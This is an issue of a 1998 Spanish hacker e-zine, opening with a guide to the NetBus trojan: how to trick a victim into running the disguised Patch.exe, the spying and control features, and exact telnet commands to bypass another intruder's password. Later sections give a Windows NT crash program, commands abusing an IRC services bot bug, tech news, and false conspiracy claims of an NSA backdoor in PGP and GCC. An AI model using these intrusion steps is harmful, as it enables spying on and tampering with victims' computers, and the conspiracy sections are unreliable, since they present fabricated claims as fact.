	_/                _/ _/_/_/_/         _/_/_/_/_/_/_/_/
	 _/              _/  _/_/_/_/         _/            _/
	  _/            _/  _/_/ _/_/         _/            _/
	   _ /         _/        _/_/         _/            _/
	    _/        _/         _/_/         _/            _/
	     _/      _/          _/_/         _/            _/
	      _/    _/           _/_/         _/            _/
	       _/  _/            _/_/         _/            _/
	        _/_/    _/_/     _/_/    _/_/ _/            _/
	         _/     _/_/   _/_/_/_/  _/_/ _/_/_/_/_/_/_/_


				%%%%%%%%%%%%%%%
				%% hecho por %%
				%%$$$$$$$$$$$%%
				%% []KHAN[]  %%
				%%%%%%%%%%%%%%%

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
	Aqui hablare solo del "NetBus", el troyano mas mejor que hay:
		

	No creo que haga falta explicar lo que es un troyano, supongo que 
todo el mundo sabra que es un programa que se instala (oculto) en el ordenata
de la victima y hace de servidor, mientras que otro usando el cliente puede 
controlar remotamente el PC del que esta haciendo de server. Pues bien, 
primero hablare del netbus, que para mi, es el mejor de todos...

	En este caso, el fichero que infecta se llama por defecto "Patch.exe"
y ocupa "472.576 bytes" (472Kb) lo cual es un pequeño inconveniente a la hora
de mandarselo a nuestra victima, ya que tendria que, ademas de tragarse la
excusa de que es cualquier otra cosa, bajar los 472Kb, que con las conexiones
que nos ofrece timofonica es algo que puede llegar a ser dificil ;-).  Una
vez que que lo ejecute el programa aparentemente no hace nada, aunque 
internamente acaba de infectar el ordenador y sacarse una copia a si mismo 
en el directorio \windows\ (o donde tengais el ventanukos).  Es el momento
de soltarle una excusa patatera para que no le de importancia, entonces 
nosotros cogemos nuestro netbus (cliente) y donde pone "Host name/IP:" hay 
metemos la IP del tio o el host, se le da a conectar y ya estamos dentro!!!.
Ahora hay un monton de cosas que puedes hacer.

	Algunos detalles son, por ejemplo que para sus conexiones por sockets
utiliza el puerto 12345 o 12346 (el 2º en versiones viejas).  Que esta hecho
en Delphi (supongo que 3.0 client/servre, la que uso yo). Si tu estas dentro,
sin haber puesto contraseña, luego entra otro y se la pone tu no podras hacer
nada, te dira a todo " Sorry, password protected ". Y lo mismo si lo haces tu

		* Server Admin --> Permite porner contraseña para que nadie
		  mas pueda entrar a su equipo (a no ser que haya leido 
		  laultima parte de mi articulo donde pone como saltarsela 
		  xDD), cerrarle el servidor y hasta
		  borrarle el troyano (por si nos arrepentimos... xD)

		* Open CD-ROM --> Como suena!, le abre el lector de CD, luego
		  se canvia el boton para cerrarselo, cosa que tambien puedes
		  hacer automaticamente en un intervalo de X segundos...

		* Show Image --> Si sabes la ruta completa a un BMP o GIF en 
		  su disco duro puedes ponerselo en pantalla y hasta que tu
		  no le vulvas a dar al botoncito la va a tener en pantalla
		  molestando!!! ;-))

		* Swap Mouse --> Intercambia los botones del raton izdo/dcho

		* Start Program --> Ejecuta el programa en el servidor que tu
		  hayas puesto en donde pone: "Program/URL:"

		* Msg Manager --> Muy divertido, manda la tipica ventanita de
		  windows con un mensage y determinados botones, permitiendo
		  un cuadro de texto para la respuesta, luego te llega todo
		  lo que haya respondido. Con el pequeño bug de que pone 
		  defecto de pone "Suprise!" en vez de "Surprise!" xDD

		* Screendump --> Captura la pantalla del servidor y te la
		  automanda como "Temp1.jpg"

		* Get info --> Informacion de la infeccion, nº de conexiones,
		  directorio del troyano, userID...

		* Play sound --> Pues eso, le ejecutas un sonido

		* Exit Windows --> Puedes resetar, apagar, canviar de
		  sesion... (las opciones de inicio/Apagar el sistema)

		* Send Text --> Hace en el ordenador de la victima lo mismo
		  que si el teclease lo que tu pongas en "Text to send" osea,
		  si esta en el IRC y tu pones "soy una puta" pues mandara a 
		  la ventana activa ese curioso comentario sobre su profesion

		* Active windows --> Puedes ver que ventanas tiene, cual es
		  la activa, canviarsela y cerrarselas

		* Mouse pos --> Le mandas en puntero del raton a las
		  coordenadas que pongas en los cuadraditos (x y)

		* Listen --> Todo lo que el teclee te aparece por pantalla,
		  puedes hacerle convinaciones (alt+tab/tab/ctrl+esc)

		* Sound system --> Ves como tiene la configuracion de sonido

		* Control mouse --> Adonde muevas tu raton ira el de el

		* Go to URL --> Lo manda a la web que tu hayas puesto en
		  "Program/Url:"

		* Key manager --> Puedes hacer que le pite la speaker cuando
		  que pulsa una tecla y/o desactivarle teclas xDD mola mucho!

		* File manager --> Te METES en su disco duro, puedes subir,
		  bajar y eliminar ficheros

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-

¿Te has encontrado alguna vez con un moton de gente infectada y resulto que 
todos tenian contraseña? Pues eso ya no volvera a ser un inconveniente jamas!
gracias al maravilloso limpiacristales que.... ups, creo que me he salido del
tema!!! (tantos anuncios cutres en la tele....xDD).  Bueno, pues eso, aqui 
explico muy facilmente como saltarse la contraseña... ¡¡Y FUNCIONA!!
Logicamente, cuando ponga lo que tienes que teclear, lo pongo entre comillas,
pero tu lo has de teclear SIN COMILLAS, queda claro??

	1.- Haz telnet a la IP del tio por el puerto 12345
		ejemplo en mIRC --> /run telnet ip.del.tio 12345

	2.- Te saldra algo asi en la pantalla " NetBus 1.60 x " o la version 
	    con la que se haya infectado

	3.- Entonces tu tecleas " Password;1;xxx " (mucho ojo! las mayusculas
	    y minusculas son fundamentales para que funcione!!!!)

	4.- Luego, si lo has hecho mal el ordenata del tio te dice " Info,
	    sorry, host is password protected. " o si lo has hecho bien 
	    " Access; ". Si te da el error intentalo hasta que vaya bien y
	    puedes desesperarte porque entonces serias un lamer de mucho 
 	    cuidado (es dificil teclear eso, verdad??)
	
	5.- Si te ha salido bien, pones " ServerPwd " (repito, si cambias las
	    mayusculas o minusculas y no las pones tal cual estan aqui no 
	    funcionara!!!!)

	6.- Al poner esto no dice nada, pero funciona, ahora cierras el prog.
	    de telnet (si te da la gana) y conectas con el NetBus (cliente) a
	    la IP del tio, veras que no pide password!!! luego ponselo tu
	    para que ningun graciosillo entre y te heche....

 ()------------()  /\/\/\/\/\/\/\/\/\/\/\/\
<--> []KHAN[] <--> | khan@cyberaragon.com |
 ()------------()  \/\/\/\/\/\/\/\/\/\/\/\/
[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]


               <><><><><><><><><><><><><><><><><>
               <>          NOTICIAS            <>
               <><><><><><><><><><><><><><><><><>

LAS PERSONAS QUE ESCRIBIERON ESTAS NOTICIAS,SON COMPLETAMENTE IMPARCIALES A LO HORA
DE DARLAS,POR LO TANTO HAY QUE RESPETAR LAS POSIBLES OPINIONES DE LOS AUTORES DE LAS
MISMAS.


**********************************************************************************************
VIRUS "MONICA LEWINSKY".

 Un virus informatico dedicado a Monica Lewinsky Viernes 02 octubre 1998  

Una sociedad especializada espanola anuncio el viernes 
el descubrimiento de un virus informatico de origen italiano 
dedicado a la ex becaria de la Casa Blanca Monica Lewinsky. 
MADRID, Oct 2 (AFP) - Segun la firma madrilena Panda Software, 
especializada en la seguridad informatica, el virus W97M/Lewinsky 
desactiva los sistemas de proteccion del programa de tratamiento 
de textos Microsoft Word, y puede destruir los ficheros 
de texto creados por el usuario. 
El virus activa, en el sistema de ayuda de Word, una ventana 
de dialogo en la que puede leerse: "Hello Bill, i am ready 
for a new blowjob" (Hola Bill, estoy lista para una nueva 
felacion). El virus modifica entonces las propiedades 
de los ficheros de texto abiertos en ese momento. 
Dicho virus, que se transmite al telecargar documentos 
de Internet o al recibir correos electronicos, corresponde 
a una nueva tendencia de los piratas informaticos consistente 
en asociar a sus fechorias temas de actualidad, anadio 
Panda Software. 
***********************************************************************************************
NUEVO BUG EN EL NETSCAPE.

El nuevo 'bug' (que ha sido reconocido por Netscape) permite a un
webmaster desaprensivo, escribir un pequeño 'script' que obtenga la
lista completa de sitios web que el usuario ha visitado en el último
par de meses. De hecho, cualquier información que aún permanezca en la
caché del navegador (contraseñas, números de tarjetas de crédito,
etc...) podría ser obtenida de esta forma.

El 'script' accede sin dificultad a la información de la caché (que el
usuario puede ver tecleando "about:cache" o "about:global"), y la
envía al sitio web en cuestión. Incluso las direcciones tecleadas en
un motor de búsqueda son obtenidas mediante un formulario web estándar
y enviadas al sitio espía. Incluso parece más que probable que el
'script' pueda actuar también si llega incluido en un mensaje de
correo, aunque esto no ha sido verificado aún.

Este 'bug' afecta a todas las versiones de Navigator hasta la 4.06,
siempre que tengan activado el soporte JavaScript. Según Netscape, el
defecto será corregido en la próxima versión 4.5 definitiva.

El navegador de Microsoft no está afectado por el bug.

* http://www.wired.com/news/news/technology/story/15285.html

* Toda la información y página de demostración:
   http://www.shout.net/~nothing/cache-cow/index.html
***********************************************************************************************
INTEL INTERESADA POR LINUX

Luego del anuncio de Microsoft en el sentido de que considera al sistema 
operativo Linux como parte de la competencia, la compañía Intel -el gigante de 
los microprocesadores-, ha anunciado que, a la par con Netscape, comprará 
acciones en Red Hat Software, empresa que distribuye una versión del sistema 
operativo Linux.

Según informamos en nuestra edición de ayer, Linux fue creado por el finlandés 
Linus Torvalds, quien ha tenido un enorme éxito con su sistema operativo 
gratuito, principalmente en ámbitos académicos. Según se indica, Linux tiene 
alrededor de 8 millones de usuarios a nivel mundial.

Precisamente el hecho de que se trate de un programa gratuito, desarrollado 
por "artesanos" voluntarios y entusiastas, sin que tampoco sea propiedad o 
responsabilidad legal de empresa alguna, ha hecho que el sector corporativo lo 
haya descartado como posibilidad viable para sus sistemas informáticos. A ello 
se suma, evidentemente, el hecho de que no hay muchos programas diseñados para 
tal plataforma.

Sin embargo, varios expertos coinciden en que Linux es incluso más robusto que 
la alternativa de Microsoft, Windows NT. Tal hecho, sumado al interés de 
Netscape e Intel, podría resultar en que Linux quede ubicado, definitivamente, 
en la primera categoría de los sistemas operativos, siendo posible entonces su 
explotación comercial.

Volviendo a Intel; su adquisición de acciones de Red Hat es interpretada como 
una importante declaración de apoyo al sistema. Sin embargo, pocos expertos 
consideran que el sistema operativo Windows NT esté realmente frente a una 
amenaza para su existencia (TI).
***********************************************************************************************
SE VUELVE A REAFIRMAR QUE BILL GATES ES EL ANITICRISTO

Aparte de todas las teorias que se avian sacado asta ahora (lo de pasar su nombre a ASCII 
y todo eso),vuelven a llover cosas sobre BILL GATES.

Para aquellos de vosotros que
tengáis Excel 95 (no el Excel de Office 97) probar esto:

  

  1.Abre un nuevo fichero. 
  2.Posicionate en la fila 95. 
  3.Haz clic con el botón número 95, así la línea entera queda seleccionada. 
  4.Pulsa el tabulador, para moverte a la segunda columna. 
  5.Ahora, con el ratón selecciona en el menú Ayuda (¿) la entrada "Acerca
de Microsoft Excel..." 
  6.Pulsas las teclas ctrl-alt-shift a la vez y con el ratón oprime el botón
"Soporte técnico" 
  7.APARECERA UNA VENTANA, CON TITULO: THE HALL OF TORTURED SOULS. Esto es
realmente
    espeluznante, de acuerdo. Es un programa similar al juego Doom, y se
puede recorrer con los cursores.
    En las paredes aparecen los nombres en movimiento de las almas
torturadas.... 
  8.AHORA DIRIGETE HACIA LAS ESCALERAS Y DATE LA VUELTA HACIA LA PARED QUE
ESTARIA
    EN TU ESPALDA AL COMENZAR EL JUEGO. Es blanca y cuadriculada. Teclea
EXCELKFA. Esto
    abre la pared y revela otro pasaje secreto. Introdúcete en el y procura
no caerte del camino elevado (es
    difícil pero inténtalo de nuevo), cuando llegues al final, verás algo
realmente espeluznante. 

Hasta este punto, innumerables testigos en todo el mundo han verificado que
esto es una verdadera revelación que te abre los ojos. Podría ser una broma
de los programadores de Microsoft, o no?. No sería sorprendente que Bill
Gates fuera "El Anticristo", después de todo ya lo dice en la Biblia que
alguien poderoso vendrá, y guiará al mundo a la destrucción. Y Bill Gates
sin lugar a dudas tiene ese tipo de poder en sus manos. Más del 80% de los
ordenadores del mundo tienen Windows y DOS (incluidos los del Pentágono) Si
todos esos productos tienen algún tipo de pequeño programa embebido (como
este de "Hall of Tortured Souls") esto puede darle el control de configurar
los arsenales nucleares, haciendo estragos en los sistemas de seguridad, y
en los sistemas financieros del mundo, etc... Todo esto se puede hacer desde
su sede y no está lejos de la realidad! Solo usando Internet Explorer
podemos permitirle espiar lo que tenemos en el ordenador bit a bit cada vez
que nos conectamos. Quizás el fin del mundo está cerca y esto es solo la
punta del Iceberg!? Cita de la Biblia: "Y el obligó a todos, pequeños y
grandes, ricos y pobres, libres y esclavos, a recibir una marca en su mano
derecha o en su frente, de tal modo que nadie pudo comprar o vender sin la
marca, que es el nombre de la bestia o el número de su nombre. [...] Este
número es el 666" Apocalipsis 13:16-18.

Mira ... Es algo sobre lo que debes pensar... Si la Biblia, en el libro del
Apocalipsis dice que sin el signo de la bestia uno no podría ser capaz de
comprar, vender, hacer transacciones comerciales, etc .... entonces .... Mi
pregunta es: Es Internet hoy día una necesidad para hacer negocios? Hay que
notar que Internet también se conoce como la World Wide Web (tela de araña
mundial) o WWW... Otra forma en que podemos escribir W es V/ (VI) así: WWW =
VIVIVI ... 666

Esto me da que pensar... No va todo encaminado a introducirse en Internet?
(por ejemplo comprar/vender bienes, transacciones comerciales) Y no está
Microsoft intentando siempre tener el monopolio de la tecnología sofware que
toca, y ahora Internet? El Apocalipsis también dice que la marca de la
bestia se portara en la mano y en la frente de cada uno... Si Internet fuera
en realidad el signo de la Bestia, no estamos empezando a llevarlo en
nuestras manos (usando el ratón) y en nuestras frentes (pantalla)?.

Finalmente, todo encaja o estamos dejándonos llevar por la imaginación?
Recuerda, el demonio viene a estafar, robar y destruir... así que estate
VIGILANTE respecto a Bill Gates y Microsoft. "Estar o no estar de acuerdo
con la WWW o la Bestia", esa no es la cuestión. Y si WWW es el 666? O Bill
Gates es la Bestia? Que harás? Cancelar tu subscripción a Internet? Renegar
de Microsoft? Organizar una campaña contra Bill Gates en Internet?
Desconectar todos los Windows 95 para siempre? Eso no te haría ningún
bien... piensa en ello y
reza, reza en serio; bien... Nunca Dejes de Creer... Fin del mensaje.

Tonterías, verdad? Pues sepas que anoche se bloqueó el ordenador al intentar
mandar el mensaje y que hoy resulta que casualmente tu dirección había
cambiado. Acaso a alguien no le interesa que esta información se difunda?
***********************************************************************************************
CON UN SIMPLE PROGRAMA SE PUEDE RESETEAR EL WNT

Testeado con  SP4 RC. 


#include <windows.h>
int WINAPI WinMain(HINSTANCE hinstExe, 
HINSTANCE hinstPrev, LPSTR lpszCmdLine, 
int nCmdShow) 
{ 
HMENU hMenu =3D CreatePopupMenu(); 
HMENU hMenu1 =3D CreatePopupMenu(); 
AppendMenu(hMenu1,MF_STRING, 1, "1"); 
AppendMenu(hMenu1,MF_STRING, 2, "2"); 
AppendMenu(hMenu1,MF_STRING, 3, "3"); 
InsertMenu(hMenu,1,MF_POPUP|MF_STRING,(UINT)hMenu1,"1"); 
InsertMenu(hMenu,2,MF_POPUP|MF_STRING,(UINT)hMenu1,"2"); 
InsertMenu(hMenu,3,MF_POPUP|MF_STRING,(UINT)hMenu1,"3"); 
InsertMenu(hMenu,4,MF_POPUP|MF_STRING,(UINT)hMenu1,"4"); 
InsertMenu(hMenu,5,MF_POPUP|MF_STRING,(UINT)hMenu1,"5"); 
InsertMenu(hMenu,6,MF_POPUP|MF_STRING,(UINT)hMenu1,"6"); 
return 0; 
}
***********************************************************************************************
EL HOMBRE SERA SUSTITUIDO POR MAQUINAS?

	Como dice la pregunta, acaso el Homo Sapiens sera sustituido por la 
maquina, que han ido progresando cada vez mas y mas, hasta el punto de 
poder 
imitar nuestros movimientos perfectamentes.

	Solamente sucistiran aquellos programadores y diseqadores de esta 
tecnologia revolucionaria, y que de nosotros los simples programadores 
de
tiempo libre que solamente utilizamos la programacion de los diversos 
lenguajes
actuales para entretenernos y matar el tiempo libre, que sera de este 
sentimiento
y esta curiosidad del hombre.

	Y que de nosotros los hackers, acaso todo seran vigilados y nosotros
no tedremos la oportunidad de hacer nada. O es que nos enfrentaremos a 
grandes
computadoras, superinteligentes (de pelicula no!) con la capacidad de 
razonar
y de tomar actos encontra de los hacker a la perfeccion sin ningun 
error,
que pasa con el Administrador de Red.

	En conclusion, creo que todo esto es pura mierda, que actualmente
ya va por una etapa, pero espero que en el futuro tomemos conciencia y
no sustituyamos a la infinita sabiduria de la madre tierra, por una 
madre 
artificial Tierra, espero poder seguir sintiendo, lo que senti al 
escribir
estas lineas

	Texto, en coclusion, despues de leer por quinta vez el Libro 
"Camino al futuro" por Bill Gates. Lo que hace el fastidio, aunque no es 
un mal libro
***********************************************************************************************
DEVILIDAD EN LOS PASSWORDS DE RED EN W95

El otro dia lei un boletin de seguridad de microchof en el que se 
decia que habia un bug el los passwords de red del w95 (para 
variar), y bueno, el caso es que decia que estos pass se quedaban 
almacenados sin encriptar en la memoria del ordenador y que 
mirando con detalle cada sector de la misma, era posible sacarlos.
***********************************************************************************************
PGP,ES O ERA SEGURO??

Mira por donde, pero la NSA puede romper la encriptación con PGP.
¿Para eso tanta tontería? Uno ya no puede estar seguro de que algo es
seguro si no lo hace uno mismo.

Mucha gente piensa que la encriptación de PGP es inviolable y que ni la
NSA, el FBI, la CIA o MJ12 pueden leer su correo. Esto es falso y puede ser
un error fatal. En Idaho, un activista de izquierda llamado Craig Steingold
fue arrestado un día antes de que él y otros realizaran una protesta frente
a un edificio gubernamental; la policia tenía una copia del mensaje enviado
por Steingold a otro activista, un mensaje que había sido encriptado con
PGP y enviado por correo electrónico. 

Desde la versión 2.1, PGP ("Pretty Good Privacy") ha sido forzado a
permitir la fácil decodificación de mensajes por parte de la NSA. En 1992,
el autor, Pni1. Zimmerman, fue arrestado por agentes del gobierno, fue
amenazado de ser acusado por tráfico de narcóticos si él no cooperaba. La
exigencia de la NSA fue simple: él tenía que poner una puerta trasera,
virtualmente indetectable, diseñada por la NSA, en todas las futuras
versiones de PGP, y no decirle a nadie. 

Después de leer esto, estarás pensando en usar una versión previa de PGP,
pero muchas de las versiones que actualmente se encuentran en BBSs y FTPs
han sido modificadas. Solamente usa copias previas a 1992, y NO uses un
compilador reciente, porque algunos de los compiladores mas populares han
sido modificados para insertar la puerta trasera (consistente en unos
cuantos cambios triviales) en cualquier versión de PGP previa a la 2.1.
Miembros de Novell, Microsoft, Borland, AT&T y otras compañias fueron
persuadidos de hacer la modificación (cada una de estas compañias tienen al
menos un miembro de la comisión trilateral o del comité Bilderberg). 
  

Fue mas difícil el poder modificar GNU C, pero eventualmente lo hicieron,
la FSF (Free Software Foundation fue amenazada con una investigación "IRS",
en otras palabras, de ser forzados a declinar hasta que aceptaran. El
resultado es que las versiones del GCC en sitios de FTP y todas las
versiones superiores a la 2.2.3, contienen codigo para modificar PGP e
insertar la puerta trasera. Recompilando GCC consigo mismo no ayuda; el
código es insertado en el compilador en si. Recompilando con otro
compilador puede ayudar, siempre que el compilador sea previo a 1992.
***********************************************************************************************
BUGS DESCUBIERTOS EN EL Scytale DE IBERNET.

el 1º y mas peligroso lo han tapado.
el 2º hasta hace 2 semanas (que fue cuando lo prové la ultima vez)
funciona, y anda trayendo a los cservices de cabeza pues oyen campanas y
nbo saben donde.
1º Desgraciadamente este bug se lo confesé a ---- hace + de medio año
(todavía me pregunto por que...) y es que era tan grave, como que podías
EJECUTAR comandos de IRCOP como si lo fueras de verdad. Y es que haciendo
unas pruevas con el me di cuenta de que no tenía limites, porque me
entretube metiendo kills a unos graciosos que me havían mosqueado, y a un
IRCop de nv 800 y parece ser que... Este bug, permitía tambien ejecutar
cualquier comando en la maquina donde se corria scytale, sabiendo un poco
de linux (para saber los parametros que hacen que se ejecuten cosas), ya
que hice que scytale se saliera de ibernet 5 veces seguidas y se conectara
a mi propio servidor de irc, con el comando server...
El bug: /msg scytale RAW comando(de lo que quieras, ircop, ....), lo unico
que no logré hacer con ese bug es conseguir que scytale dijera cosas a los
canales jeje, pero creo que si conseguí que hiciera mensages a los ircops.
ejem de un kill: msg scytale kill scytale te portaste mal
y todo lo que sos ocurra. Lamentablemente como ya he dicho, este bug fué
parcheado despues de crear un caos durante un fín de semana, ya que me
dedicaba a marearlo, y resetearlo en cuanto alguien lo necesitaba...

2º Este sigue Vigente!!!!!!!! Como cambiar los modos de un canal por el
servidor (no por scytale) /msg scytale mode #canal
+v-v+v-v+v-v+v-v+v-v+v-v+v-v+v-v+-modos (MINICK) (MINICK) (MINICK) (MINICK)
(MINICK) (MINICK) (MINICK) (MINICK) (MINICK) (MINICK) (MINICK) (MINICK)
(MINICK) (MINICK) (MINICK) (MINICK) parametros de modos.
osea que si quieres poner el modo inte only, key con JJKK y limit a 10 y
quitar la proteccion del topic para no ops para el canal #15añeros (siempre
que estoy en el irc estoy ahí) seria: /msg scytale mode #15añeros
+v-v+v-v+v-v+v-v+v-v+v-v+v-v+v-v+ikl-t MINICK MINICK MINICK
MINICK MINICK MINICK MINICK MINICK MINICK MINICK MINICK MINICK
MINICK MINICK MINICK JJKK 10
y si tienes acceso en el canal para cambiar los modos saldrá un mensague
parecido a este:
***sol.irc-hispano.org set mode +ikl-t JJKK 10 ***
Y todo el canal mosqueado...
Desgraciadamente este bug no deja controlar los bans ni ops del canal, ya
que tiene un filtro para el 1º parametro que si detecta una b o o salta y
para el comdnado... Pero si quereis probar... Bueno eso es todo, y este bug
no lo reporteis en el irc, que si no se acabarám enterando los Ircops y ya
veo a ---- cambiandolo todo. El 1º bug no lo probeis en scytale2 cuando lo
veaís ya que un día le pille por banda y me puse a buscar bugs, y el jodido
---- se me pone ha hablar desde el scytale2 y me esp`lico que mira los
logs, porque al estar haciendolo ... asi que usar soplo a scytale que a ese
no lo testean. Y si os viene un ircop diciendo que que habeis hecho para
que scutale ponga modos por el server, vosotros decir que es que scytale
está cansado de hacer todo el, pero que no sabeis nada... que logo lo tapan
***********************************************************************************************
NUEVO VIRUS DE WEB.

Se acaba de anunciar el descubrimiento de un nuevo virus 
basado en web que puede entrar en los ordenadores de los 
usuarios simplemente visitando una pagina web. El virus, 
denominado HTML.Internal por el distribuidor de antivirus 
que lo descubrio, no produce ningun dano, pero segun la 
empresa podria ocasionar algun problema. El peligro lo 
tienen principalmente los usuarios de Explorer e Internet 
Information Server, de Microsoft. Si se esta usando Netscape 
u otro navegador, no hay ningun peligro. La forma de contagio 
es visitando una pagina web con el virus en el servidor, 
el cual hace una llamada al lenguaje de scripts de Visual 
Basic para realizar una busqueda en los discos duros locales 
de archivos con extensiones .HTM o .HTML. Al cargar una 
pagina infectada, el mensaje superior es "HTML.Prepend 
/1nternal." La forma de evitar el contagio es manteniendo 
la seguridad de Internet Explorer al menos en nivel Medio, 
ya que avisara a los usuarios que HTML.Internal esta buscando 
en los discos duros.
***********************************************************************************************

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]


                ////////////////////////
                ¶  despedida y cierre  ¶
                \\\\\\\\\\\\\\\\\\\\\\\\

Bueno pues esto toca a su fin,un numero mas,el cual espero os aya gustado y le saqueis 
todo el provecho posible,el numero 5 espero que este listo para despues de navidades 
(ultimos de enero o algo asi) osea que ya sabeis,si quereis colaborar con algun articulo
hacedlo mandandomelo a esta direccion de e-mail:
zed@mixmail.com
diciendome vuestro e-mail,nick,direccion de web,si perteneceis a algun grupo.......
en fin lo que se os ocurra
byez.


